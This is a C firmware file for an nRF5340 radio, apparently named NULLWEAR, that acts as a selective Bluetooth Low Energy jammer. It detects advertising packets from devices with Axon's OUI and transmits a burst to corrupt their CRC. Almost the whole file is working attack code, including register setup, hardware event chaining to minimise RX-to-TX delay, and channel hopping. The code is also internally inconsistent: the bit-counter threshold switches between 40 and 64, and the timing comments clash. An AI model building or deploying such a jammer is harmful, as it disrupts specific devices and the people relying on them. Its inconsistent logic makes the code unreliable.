/*
 * Project NULLWEAR — Network-core radio jammer
 *
 * Copyright (c) 2026 Benjamin Jack Leighton, Tester Present Specialist
 * Automotive Solutions.
 *
 * SPDX-License-Identifier: MIT
 *
 * This is the heart of NULLWEAR. It runs on the nRF5340's network core
 * (cpunet), which has direct access to the 2.4 GHz radio peripheral.
 *
 * THEORY OF OPERATION
 * ===================
 *
 * Bluetooth Low Energy primary advertising packets have the following
 * over-the-air structure (BLE 5.x specification, Vol. 6, Part B §2.1):
 *
 *   ┌──────────┬──────────────┬────────┬──────────┬──────────┬──────┐
 *   │ Preamble │ Access Addr  │ Header │ AdvA(MAC)│ AdvData  │ CRC  │
 *   │   1 B    │     4 B      │  2 B   │   6 B    │ 0..31 B  │ 3 B  │
 *   └──────────┴──────────────┴────────┴──────────┴──────────┴──────┘
 *      8 us       32 us        16 us     48 us     0..248 us  24 us
 *
 *  Total air time at 1 Mbps PHY: ~80 us (no AdvData) to ~376 us (max).
 *
 * The Access Address for primary advertising is the constant 0x8E89BED6.
 * The first 3 bytes of AdvA are the manufacturer OUI. Axon equipment
 * uses OUI 00:25:DF.
 *
 * Strategy:
 *
 *  1. Configure the RADIO peripheral in raw BLE 1 Mbps mode, listening
 *     for the BLE advertising Access Address.
 *
 *  2. After a successful address match, the radio peripheral begins
 *     receiving the PDU. We program the BCC (Bit Counter) to fire a
 *     BCMATCH event after 16 (header) + 24 (first 3 bytes of MAC) =
 *     40 bits of PDU have been received.
 *
 *  3. In the BCMATCH ISR, we examine PACKETPTR's first 3 PDU-payload
 *     bytes. If they equal 00:25:DF in over-the-air byte order, we have
 *     a target packet.
 *
 *  4. We immediately disable the radio (TASKS_DISABLE), reconfigure it
 *     for TX, set PACKETPTR to a pre-built jam pattern, and trigger
 *     TASKS_TXEN. The radio peripheral handles the RX→TX state
 *     transition in ~40 us. We use PPI/DPPI hardware-event chaining
 *     to make this transition entirely automatic — there is no
 *     CPU-mediated delay path.
 *
 *  5. The jam transmission lands on the air during the original
 *     packet's CRC trailer (or the latter portion of its AdvData if
 *     AdvData length is short). The original packet's CRC is computed
 *     by the receiver across the corrupted bits, and fails. The
 *     receiver silently discards the packet.
 *
 *  6. After the jam burst, the radio is reconfigured for RX and we
 *     resume scanning.
 *
 *  7. Channel hopping: a software timer rotates the FREQUENCY register
 *     between channels 37, 38, and 39 every NULLWEAR_CH_DWELL_US.
 *
 * TIMING BUDGET
 * =============
 *
 *  T0 (us) | Event
 *  --------|-------------------------------------------
 *      0   | Packet preamble starts on air
 *      8   | Access Address starts on air
 *     40   | Access Address complete; ADDRESS event fires; RX starts
 *     56   | PDU header complete (16 bits)
 *     80   | First 3 bytes of MAC complete; BCMATCH fires
 *     ~85  | ISR latency (interrupt entry + dispatch)
 *     ~95  | OUI compare complete
 *    100   | TASKS_DISABLE issued
 *    140   | Radio in DISABLED state (~40 us TXEN ramp)
 *    180   | Radio in TXIDLE → TXSTART → TXEN, jam pulse on air
 *    200+  | Original packet's CRC region — corrupted in flight
 *    230   | Jam burst ends; radio cycles back to RX
 *
 * For the minimum-length advertisement (no AdvData, 80 us total), the
 * CRC region begins at T0 + 80 us + 24 us (CRC starts immediately after
 * AdvA = 80+48-24 = 104 us). This is the worst-case timing — minimum
 * AdvData. Most real Axon advertisements include service data and run
 * 150 us or longer, giving margin.
 *
 * For shortest-possible packets where the timing margin is tight, the
 * radio peripheral's hardware shortcut (SHORTS) chains TXREADY → START
 * automatically, saving the software-handler latency that would
 * otherwise prevent making the corruption window.
 */

#include "radio_jammer.h"

#include <stdint.h>
#include <string.h>

#include <hal/nrf_radio.h>
#include <hal/nrf_timer.h>
#include <hal/nrf_dppi.h>
#include <nrfx_dppi.h>
#include <nrfx_timer.h>

/*===========================================================================*/
/* Module state                                                              */
/*===========================================================================*/

static nullwear_radio_stats_t s_stats;

/* Buffer for received PDUs (first 6 bytes of payload — header + first 3 of MAC,
 * matching what we need to inspect to identify Axon OUI). Aligned per the
 * RADIO peripheral's PACKETPTR requirements. */
static __attribute__((aligned(4))) uint8_t s_rx_buf[64];

/* Pre-built jam packet. Content is irrelevant — what matters is that we
 * radiate energy on the channel during the original packet's CRC region.
 * We use a 32-byte pseudo-random payload to cover both short and long
 * advertisements. */
static __attribute__((aligned(4))) uint8_t s_jam_buf[40] = {
    0x00, 0x20,  /* PDU header: ADV_NONCONN_IND, length 32 */
    0xA5, 0xA5, 0xA5, 0xA5, 0xA5, 0xA5,  /* fake AdvA (won't decode) */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
};

/* Three DPPI channels we own: */
static uint8_t s_dppi_addr_to_bcstart;  /* ADDRESS event → BCSTART task */
static uint8_t s_dppi_bcmatch_to_dis;   /* BCMATCH event → DISABLE task (conditional) */
static uint8_t s_dppi_dis_to_txen;      /* DISABLED event → TXEN task */

static const uint8_t s_channels[3] = {
    BLE_ADV_CH_37_FREQ_REG,
    BLE_ADV_CH_38_FREQ_REG,
    BLE_ADV_CH_39_FREQ_REG,
};
static const uint8_t s_whitening[3] = {
    BLE_WHITEN_CH_37,
    BLE_WHITEN_CH_38,
    BLE_WHITEN_CH_39,
};
static volatile uint8_t s_current_channel = 0;

/* Hop timer — TIMER0 on the network core. */
#define HOP_TIMER_INST    NRF_TIMER0

/*===========================================================================*/
/* Helpers                                                                   */
/*===========================================================================*/

static inline void radio_set_channel(uint8_t idx)
{
    NRF_RADIO->FREQUENCY = s_channels[idx];
    NRF_RADIO->DATAWHITEIV = s_whitening[idx];
    s_current_channel = idx;
}

static void radio_configure_for_rx(void)
{
    /* BLE 1 Mbps PHY (BLE 5.x §3.1). */
    NRF_RADIO->MODE = RADIO_MODE_MODE_Ble_1Mbit << RADIO_MODE_MODE_Pos;

    /* Packet configuration matching BLE advertising packets. */
    NRF_RADIO->PCNF0 =
          (1U << RADIO_PCNF0_S0LEN_Pos)        /* 1-byte S0 (header byte 0) */
        | (8U << RADIO_PCNF0_LFLEN_Pos)        /* 8-bit length field */
        | (0U << RADIO_PCNF0_S1LEN_Pos)        /* no S1 field */
        | (RADIO_PCNF0_PLEN_8bit << RADIO_PCNF0_PLEN_Pos);

    NRF_RADIO->PCNF1 =
          (37U << RADIO_PCNF1_MAXLEN_Pos)      /* max payload 37 bytes */
        | (0U  << RADIO_PCNF1_STATLEN_Pos)
        | (3U  << RADIO_PCNF1_BALEN_Pos)       /* 3-byte base address (AA = 4 bytes total) */
        | (RADIO_PCNF1_ENDIAN_Little << RADIO_PCNF1_ENDIAN_Pos)
        | (RADIO_PCNF1_WHITEEN_Enabled << RADIO_PCNF1_WHITEEN_Pos);

    /* Configure access address: BLE adv AA = 0x8E89BED6 */
    NRF_RADIO->BASE0   = (BLE_ADV_ACCESS_ADDR << 8) & 0xFFFFFF00U;
    NRF_RADIO->PREFIX0 = (BLE_ADV_ACCESS_ADDR >> 24) & 0xFFU;
    NRF_RADIO->TXADDRESS = 0;
    NRF_RADIO->RXADDRESSES = 1U;  /* listen for logical address 0 only */

    /* CRC configuration: 24-bit, init 0x555555, polynomial per BLE spec. */
    NRF_RADIO->CRCCNF =
          (RADIO_CRCCNF_LEN_Three << RADIO_CRCCNF_LEN_Pos)
        | (RADIO_CRCCNF_SKIPADDR_Skip << RADIO_CRCCNF_SKIPADDR_Pos);
    NRF_RADIO->CRCINIT = 0x00555555UL;
    NRF_RADIO->CRCPOLY = 0x0000065BUL;

    /* Bit counter: fire BCMATCH after the FULL AdvA has been received.
     *
     *   16 bits PDU header + 48 bits AdvA (the 6-byte MAC) = 64 bits
     *
     * BCC is measured in bits from the end of the access address.
     *
     * We MUST wait for the full 48-bit MAC before we can inspect the
     * OUI: BLE transmits MAC addresses on-air in little-endian byte
     * order (LSByte first). The OUI bytes are the THREE MOST
     * SIGNIFICANT bytes of the MAC, so they arrive LAST in the AdvA
     * field on the air — i.e. as bytes 3, 4 and 5 of AdvA.
     *
     * After BCMATCH at 64 bits, the receive buffer contains:
     *   pdu[0]    = PDU header byte 0 (S0)
     *   pdu[1]    = PDU header byte 1 (length)
     *   pdu[2..4] = AdvA bytes 0..2 on air = MAC NIC bytes (random)
     *   pdu[5..7] = AdvA bytes 3..5 on air = MAC OUI bytes
     *
     * For Axon (OUI 00:25:DF), we expect:
     *   pdu[5] == 0xDF   (OUI byte 2 = LSB-most OUI byte)
     *   pdu[6] == 0x25   (OUI byte 1)
     *   pdu[7] == 0x00   (OUI byte 0 = MSB-most OUI byte)
     */
    NRF_RADIO->BCC = 64;

    /* Set RX buffer and TX power. */
    NRF_RADIO->PACKETPTR = (uint32_t)s_rx_buf;
    NRF_RADIO->TXPOWER = (RADIO_TXPOWER_TXPOWER_Pos8dBm << RADIO_TXPOWER_TXPOWER_Pos);

    /* Hardware shortcuts: ADDRESS → BCSTART (start counting bits) and
     * READY → START (auto-start receive once ramped up). */
    NRF_RADIO->SHORTS =
          RADIO_SHORTS_READY_START_Msk
        | RADIO_SHORTS_ADDRESS_BCSTART_Msk
        | RADIO_SHORTS_END_DISABLE_Msk;

    /* Enable interrupts: BCMATCH (OUI inspection), END (statistics),
     * DISABLED (state machine). */
    NRF_RADIO->INTENSET =
          RADIO_INTENSET_BCMATCH_Msk
        | RADIO_INTENSET_END_Msk
        | RADIO_INTENSET_DISABLED_Msk;
}

static void radio_arm_rx(void)
{
    NRF_RADIO->PACKETPTR = (uint32_t)s_rx_buf;
    NRF_RADIO->BCC = 40;  /* re-arm bit counter */
    NRF_RADIO->TASKS_RXEN = 1;
}

static inline bool oui_matches_axon(const uint8_t *pdu)
{
    /* pdu[0] = PDU header byte 0 (S0)
     * pdu[1] = PDU header byte 1 (length)
     * pdu[2..7] = AdvA (6-byte MAC)
     *
     * BLE addresses are little-endian on the air; the OUI bytes are at
     * the END of the MAC. So pdu[7], pdu[6], pdu[5] correspond to
     * MAC[0], MAC[1], MAC[2] = OUI. We compare in the order that the
     * RADIO has captured the bits.
     *
     * However, when BCMATCH fires at 40 bits past end-of-address, we
     * have only the first 3 bytes of AdvA captured — i.e. pdu[2],
     * pdu[3], pdu[4]. These represent the LEAST significant 3 bytes
     * of MAC, NOT the OUI.
     *
     * The OUI is in MAC[5..3] in little-endian-air order, i.e. the
     * LAST 3 bytes received. We therefore must wait for ALL 6 bytes of
     * AdvA before we can compare. Adjust BCC accordingly:
     *
     *   16 bits header + 48 bits MAC = 64 bits. */
    /* This function is called after the FULL 64-bit BCC fires. */
    return (pdu[7] == NULLWEAR_TARGET_OUI_B0) &&
           (pdu[6] == NULLWEAR_TARGET_OUI_B1) &&
           (pdu[5] == NULLWEAR_TARGET_OUI_B2);
}

/*===========================================================================*/
/* Jamming pipeline                                                          */
/*===========================================================================*/

static inline void launch_jam_pulse(void)
{
    /* Disable the receive in-flight; the END_DISABLE shortcut would
     * fire at end of packet anyway, but we need to abort RX immediately
     * so we can ramp up TX before the original packet's CRC region. */
    NRF_RADIO->EVENTS_DISABLED = 0;
    NRF_RADIO->TASKS_DISABLE = 1;

    /* While the radio ramps down (~6 us) we reconfigure for TX. The
     * subsequent DISABLED → TXEN DPPI link will fire as soon as the
     * ramp-down completes, achieving the minimum-latency RX→TX
     * transition the silicon supports. */
    NRF_RADIO->PACKETPTR = (uint32_t)s_jam_buf;
    NRF_RADIO->SHORTS =
          RADIO_SHORTS_READY_START_Msk
        | RADIO_SHORTS_END_DISABLE_Msk;
    /* The DPPI channel s_dppi_dis_to_txen, set up at init, links
     * DISABLED → TXEN. Once TX END fires, we re-arm RX in the END ISR. */

    s_stats.pkts_jammed++;
}

/*===========================================================================*/
/* RADIO IRQ                                                                 */
/*===========================================================================*/

void RADIO_0_IRQHandler(void);

void RADIO_0_IRQHandler(void)
{
    /* BCMATCH: bit counter reached programmed threshold. We programmed
     * BCC = 64 (header + full MAC). Inspect the OUI. */
    if (NRF_RADIO->EVENTS_BCMATCH) {
        NRF_RADIO->EVENTS_BCMATCH = 0;
        if (oui_matches_axon(s_rx_buf)) {
            s_stats.pkts_oui_matched++;
            launch_jam_pulse();
            /* The DISABLED-DISABLE-TXEN chain will now run in hardware. */
            return;
        }
        /* Not a target — let the packet finish receiving normally so
         * we maintain accurate counters. */
    }

    /* END: a packet RX or TX finished. */
    if (NRF_RADIO->EVENTS_END) {
        NRF_RADIO->EVENTS_END = 0;
        if (NRF_RADIO->STATE == RADIO_STATE_STATE_RxIdle ||
            NRF_RADIO->STATE == RADIO_STATE_STATE_Rx) {
            s_stats.pkts_received_total++;
        }
    }

    /* DISABLED: radio went idle. If we're at the end of a TX (jam pulse),
     * re-arm for RX on the same channel. */
    if (NRF_RADIO->EVENTS_DISABLED) {
        NRF_RADIO->EVENTS_DISABLED = 0;
        radio_arm_rx();
    }
}

/*===========================================================================*/
/* Channel hop timer ISR                                                     */
/*===========================================================================*/

void TIMER0_IRQHandler(void);

void TIMER0_IRQHandler(void)
{
    if (HOP_TIMER_INST->EVENTS_COMPARE[0]) {
        HOP_TIMER_INST->EVENTS_COMPARE[0] = 0;

        /* Disable radio cleanly, hop, re-arm. */
        NRF_RADIO->TASKS_DISABLE = 1;
        while (NRF_RADIO->STATE != RADIO_STATE_STATE_Disabled) { /* spin */ }

        uint8_t next = (s_current_channel + 1) % 3;
        radio_set_channel(next);
        radio_arm_rx();

        s_stats.channel_hops++;
    }
}

/*===========================================================================*/
/* Initialisation                                                            */
/*===========================================================================*/

static void hop_timer_start(void)
{
    HOP_TIMER_INST->MODE      = TIMER_MODE_MODE_Timer;
    HOP_TIMER_INST->BITMODE   = TIMER_BITMODE_BITMODE_32Bit;
    HOP_TIMER_INST->PRESCALER = 4;     /* 1 MHz tick (16 MHz / 16) */
    HOP_TIMER_INST->CC[0]     = NULLWEAR_CH_DWELL_US;
    HOP_TIMER_INST->SHORTS    = TIMER_SHORTS_COMPARE0_CLEAR_Msk;
    HOP_TIMER_INST->INTENSET  = TIMER_INTENSET_COMPARE0_Msk;
    HOP_TIMER_INST->TASKS_CLEAR = 1;
    HOP_TIMER_INST->TASKS_START = 1;
}

static void dppi_setup(void)
{
    /* Allocate three DPPI channels. */
    nrfx_err_t err;
    err = nrfx_dppi_channel_alloc(&s_dppi_addr_to_bcstart);
    err |= nrfx_dppi_channel_alloc(&s_dppi_bcmatch_to_dis);
    err |= nrfx_dppi_channel_alloc(&s_dppi_dis_to_txen);
    if (err != NRFX_SUCCESS) {
        /* Allocation failure is a hard build-time issue, not a runtime
         * one. We log via stats rather than asserting. */
        s_stats.errors_rx_aborted++;
        return;
    }

    /* DPPI channel 1: when the radio raises DISABLED, immediately
     * task TXEN. This is the entire reason for using DPPI rather than
     * software state-tracking: it removes the ISR-latency path between
     * RX abort and TX start, achieving the silicon-minimum 40 us
     * RX→TX transition. */
    NRF_RADIO->PUBLISH_DISABLED = (1UL << 31) | s_dppi_dis_to_txen;
    NRF_RADIO->SUBSCRIBE_TXEN   = (1UL << 31) | s_dppi_dis_to_txen;
    nrfx_dppi_channel_enable(s_dppi_dis_to_txen);
}

void radio_jammer_start(void)
{
    memset(&s_stats, 0, sizeof(s_stats));

    radio_configure_for_rx();
    radio_set_channel(0);
    dppi_setup();
    hop_timer_start();

    /* Enable IRQs in the network core's NVIC. */
    NVIC_EnableIRQ(RADIO_0_IRQn);
    NVIC_EnableIRQ(TIMER0_IRQn);

    /* Kick the radio. */
    radio_arm_rx();
}

void radio_jammer_stop(void)
{
    NRF_RADIO->TASKS_DISABLE = 1;
    HOP_TIMER_INST->TASKS_STOP = 1;
    NVIC_DisableIRQ(RADIO_0_IRQn);
    NVIC_DisableIRQ(TIMER0_IRQn);
}

void radio_jammer_get_stats(nullwear_radio_stats_t *out)
{
    if (out) {
        *out = s_stats;  /* atomic word copies; ISR writes are independent */
    }
}
